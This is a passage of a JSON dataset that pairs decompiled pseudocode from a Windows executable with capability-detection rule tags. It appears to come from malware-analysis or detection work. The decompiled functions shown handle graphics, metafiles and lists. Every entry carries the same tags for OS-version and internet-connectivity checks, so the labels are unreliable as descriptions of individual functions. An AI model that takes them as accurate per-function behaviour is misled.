param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.00422220();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00422f54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422f54(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x422f6f;\n    fcn.00422e00();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x422f7b;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x422ff1;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00422f54::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.00422f54::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x422ff8, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 445
    },
    "0042302c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042302c(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x42304b;\n    fcn.00403720();\n    puStack104 = 0x42305a;\n    fcn.00403720();\n    puStack104 = &fcn.0042302c::piconinfo;\n    puStack112 = 0x423064;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x423069;\n    fcn.00423020();\n    uStack116 = 0x42321c;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.0042302c::var_1h + 1;\n    fcn.00422ee4(2);\n    puStack132 = 0x423097;\n    fcn.00422ee4(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x4231f5;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.0042302c::var_1h + 1;\n    var_18h = fcn.00402ccc();\n    var_1ch = fcn.00402ccc();\n    var_20h = fcn.00402ccc();\n    var_24h = fcn.00402ccc();\n    fcn.00422f54(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.00422f54(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402d00(0x4231fc);\n    fcn.00402d00();\n    fcn.00402d00();\n    fcn.00402d00();\n    return;\n}\n",
        "token_count": 884
    },
    "0042327c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042327c(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004040e4();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 164
    },
    "00423320": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00423320(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x00423345:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x423338;\n        iVar2 = fcn.00403e30();\n        puStack32 = 0x423341;\n        iVar3 = fcn.00403e30();\n        if (iVar2 != iVar3) goto code_r0x00423345;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x423355;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x423360;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x42339e;\n                puVar4 = fcn.00403f28();\n                uStack36 = 0x423457;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x4233b9;\n                puStack32 = &fcn.00423320::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x4233c5;\n                puVar5 = fcn.00403f28();\n                uStack48 = 0x42343a;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00423320::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.00408a2c();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x00423421;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x00423421:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x423441;\n                uStack48 = 0x423439;\n                uVar6 = fcn.00403f58();\n                return uVar6;\n            }\n            goto code_r0x0042345e;\n        }\n    }\n    puStack32 = 0x42336b;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x423376;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x0042345e;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0042345e:\n    return var_1h;\n}\n",
        "token_count": 930
    },
    "004234cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004234cc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00423848": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00423848(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423863;\n    fcn.00405254();\n    uStack32 = 0x4238cf;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00408b80();\n    fcn.00404e38();\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00414eec();\n            fcn.004051b0();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4238d6;\n    uStack32 = 0x4238ce;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 299
    },
    "004238e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004238e0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42395e;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00414eec();\n            fcn.00403e38();\n            fcn.00405004();\n            fcn.004051b0();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x423965;\n    uStack288 = 0x42395d;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 286
    },
    "00423970": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00423970(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00404184();\n            if (cVar1 != '\\0') {\n                fcn.00405c60();\n                fcn.00414dd8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004239bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004239bc(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar4;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    fcn.00404da0();\n    fcn.00404da0();\n    var_ch = 0;\n    iVar3 = *(in_EAX + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar2 = fcn.00414eec();\n            cVar1 = fcn.00404184();\n            if ((cVar1 != '\\0') && (*(iVar2 + 4) != 0)) {\n                if (var_ch != 0) {\n                    fcn.0040506c();\n                    fcn.0040506c();\n                }\n                if ((*(iVar2 + 8) == 0) && (*(iVar2 + 0xc) != 0)) {\n                    fcn.00409204();\n                    fcn.00404df4();\n                }\n                fcn.00409c94(2);\n                uVar4 = 1;\n                fcn.00409c94(1);\n                var_ch = var_ch + 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    if (1 < var_ch) {\n        arg_8h_00 = 2;\n        fcn.00406a50();\n        fcn.00409c94(arg_8h_00);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00404da0();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 514
    },
    "00423d1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00423d1c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00404184();\n            if (cVar1 != '\\0') {\n                fcn.00414dd8();\n                fcn.00414dd8();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00423d64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00423d64(void)\n\n{\n    if (*0x490df0 == 0) {\n        *0x490df0 = fcn.00423634();\n    }\n    return *0x490df0;\n}\n",
        "token_count": 54
    },
    "00423d84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00423d84(void)\n\n{\n    if (*0x490dec == 0) {\n        *0x490dec = fcn.00423c08();\n    }\n    return *0x490dec;\n}\n",
        "token_count": 52
    },
    "00424170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00424170(void)\n\n{\n    if (*0x490df0 != 0) {\n        fcn.00423970();\n    }\n    if (*0x490dec != 0) {\n        fcn.00423d1c();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "004241c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004241c4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004241f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004241f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x4242f6;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x42421f;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x42422d;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x424238;\n    fcn.00405004();\n    piStack104 = 0x424245;\n    iVar1 = fcn.004238e0();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x424253;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x424278;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x424297;\n    fcn.00403f58();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x4242b5;\n        iVar1 = fcn.0040416c();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x4242cd;\n        iVar1 = fcn.0040416c();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x4242e0;\n    fcn.00404154();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x4242fd;\n    uStack96 = 0x4242f5;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 600
    },
    "0042435c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042435c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004040e4();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 267
    },
    "00424944": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00424944(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x42495f;\n    var_4h = param_2;\n    fcn.004247e0();\n    puStack172 = 0x42496f;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x424980;\n        iVar2 = fcn.00422de8();\n        if (iVar2 == var_eh) goto code_r0x0042498b;\n    }\n    puStack172 = 0x42498b;\n    fcn.00421f88();\ncode_r0x0042498b:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x424997;\n    lpbBuffer = fcn.00402ce4();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x424ab3;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00424944::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.00421f88();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00424944::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00424944::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.00421f88();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402d00(0x424aba);\n    return;\n}\n",
        "token_count": 931
    },
    "00424e70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00424e70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x424e90;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x424ea1;\n            uVar2 = fcn.00402ce4();\n            uStack40 = 0x424eec;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.00417794();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402d00(0x424ef3);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00424efc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00424efc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x424f21;\n    fcn.00403720();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x424f53;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x424f6a;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x424f76;\n    fcn.00422de8();\n    uStack76 = 0;\n    puStack80 = 0x424f81;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x425037;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x424fa5;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x424fb0;\n    uVar4 = fcn.00402ce4();\n    uStack116 = 0x425017;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.00421fe8();\n    }\n    fcn.00417794();\n    fcn.00417794();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402d00(0x42501e);\n    return;\n}\n",
        "token_count": 797
    },
    "0042524c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
